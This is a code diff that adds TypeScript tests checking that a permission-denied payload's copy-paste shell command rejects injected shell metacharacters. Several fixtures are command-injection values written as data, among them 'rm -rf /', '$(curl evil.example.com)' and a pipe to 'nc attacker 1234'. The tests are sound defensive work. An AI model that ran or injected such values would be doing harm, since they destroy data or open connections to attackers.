@@ -169,3 +169,84 @@ describe('isPermissionDeniedPayload (runtime type guard)', () => {
     ).toBe(false);
   });
 });
+
+describe('approve_command shell safety (security fix 2026-05-29)', () => {
+  // The approve_command is intended for copy-paste into a shell. Any
+  // value containing shell metacharacters would turn the helpful hint
+  // into a command-injection vector against the human owner who runs
+  // it. These tests lock the allowlist.
+
+  const SAFE_BASE = {
+    action: 'chat.post',
+    target_kind: 'room' as const,
+    target_id: 'orsz2321qb',
+    reason: 'no_membership' as const,
+    grantee_handle: '@speedyc',
+    approvers: []
+  };
+
+  it('renders the safe form when every field passes the charset', () => {
+    const payload = buildPermissionDeniedPayload(SAFE_BASE);
+    expect(payload.permission_denied.approve_command).toBe(
+      'ant grant @speedyc chat.post --room orsz2321qb'
+    );
+  });
+
+  it('falls back to a generic command when grantee_handle contains shell metacharacters', () => {
+    const payload = buildPermissionDeniedPayload({
+      ...SAFE_BASE,
+      grantee_handle: '@x; rm -rf /'
+    });
+    expect(payload.permission_denied.approve_command).not.toContain('rm -rf');
+    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
+  });
+
+  it('falls back when action contains a backtick', () => {
+    const payload = buildPermissionDeniedPayload({
+      ...SAFE_BASE,
+      action: 'chat.post`whoami`'
+    });
+    expect(payload.permission_denied.approve_command).not.toContain('whoami');
+    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
+  });
+
+  it('falls back when target_id contains $() command substitution', () => {
+    const payload = buildPermissionDeniedPayload({
+      ...SAFE_BASE,
+      target_id: 'orsz$(curl evil.example.com)'
+    });
+    expect(payload.permission_denied.approve_command).not.toContain('curl');
+    expect(payload.permission_denied.approve_command).not.toContain('$(');
+    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
+  });
+
+  it('falls back when grantee_handle contains a pipe', () => {
+    const payload = buildPermissionDeniedPayload({
+      ...SAFE_BASE,
+      grantee_handle: '@x | nc attacker 1234'
+    });
+    expect(payload.permission_denied.approve_command).not.toContain('nc ');
+    expect(payload.permission_denied.approve_command).toMatch(/Contact your/i);
+  });
+
+  it('accepts uppercase, digits, dots, hyphens, underscores in handles', () => {
+    const payload = buildPermissionDeniedPayload({
+      ...SAFE_BASE,
+      grantee_handle: '@James.K-Bot_01'
+    });
+    expect(payload.permission_denied.approve_command).toContain('@James.K-Bot_01');
+  });
+
+  it('system-scope skips target_id charset check (no target embed)', () => {
+    const payload = buildPermissionDeniedPayload({
+      ...SAFE_BASE,
+      target_kind: 'system',
+      target_id: 'anything-goes;rm$()'
+    });
+    // System path never embeds target_id, so the dangerous chars in it
+    // don't leak into the rendered command. Still safe.
+    expect(payload.permission_denied.approve_command).toBe(
+      'ant grant @speedyc chat.post'
+    );
+  });
+});
